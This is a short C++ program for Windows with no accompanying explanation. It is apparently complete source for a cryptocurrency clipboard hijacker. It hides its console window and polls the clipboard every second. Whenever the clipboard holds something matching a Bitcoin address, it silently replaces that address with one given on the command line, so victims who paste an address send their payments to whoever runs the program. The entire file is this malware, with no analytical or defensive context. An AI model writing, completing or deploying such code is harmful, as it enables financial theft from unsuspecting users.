#include <iostream>
#include <string>
#include <Windows.h>
#include <regex>
#include <Lmcons.h>

using namespace std;

static const regex bitcoinWalletRegex = regex("[13][a-km-zA-HJ-NP-Z1-9]{25,34}");
static const int CHECK_INTERVAL = 1000;
static const string EMPTY_STRING = "";

string GetClipboard() {
	HGLOBAL hGlb;
	LPVOID lPtstr;
	char* data = nullptr;
	if (!OpenClipboard(nullptr)) {
		return EMPTY_STRING;
	}
	hGlb = GetClipboardData(CF_TEXT);
	if (hGlb != NULL) {
		lPtstr = GlobalLock(hGlb);
		if (lPtstr != NULL) {
			data = (char*)lPtstr;
			GlobalUnlock(hGlb);
		}
	}
	CloseClipboard();
	if (data != EMPTY_STRING) {
		return string(data);
	}
	return EMPTY_STRING;
}

void SetClipboard(string data) {
	size_t len = data.length() + 1;
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
	memcpy(GlobalLock(hMem), data.c_str(), len);
	GlobalUnlock(hMem);
	OpenClipboard(0);
	EmptyClipboard();
	SetClipboardData(CF_TEXT, hMem);
	CloseClipboard();
}

bool IsBitcoinAddress(regex bitcoinWalletRegex, string data) {
	smatch regexMatch;
	return regex_search(data, regexMatch, bitcoinWalletRegex);
}

string ReplaceBitcoinAddress(regex bitcoinWalletAddress, string data, string bitcoinAddress) {
	return regex_replace(data, bitcoinWalletAddress, bitcoinAddress);
}

int main(int argc, char* argv[]) {
	FreeConsole();

	if (argc < 2) {
		return 1;
	}

	string bitcoinWalletAddress = argv[1];

	while (true) {
		string currentClipData = GetClipboard();
		if (IsBitcoinAddress(bitcoinWalletRegex, currentClipData)) {
			string newData = ReplaceBitcoinAddress(bitcoinWalletRegex, currentClipData, bitcoinWalletAddress);
			SetClipboard(newData);
		}
		Sleep(CHECK_INTERVAL);
	}
	return 0;
}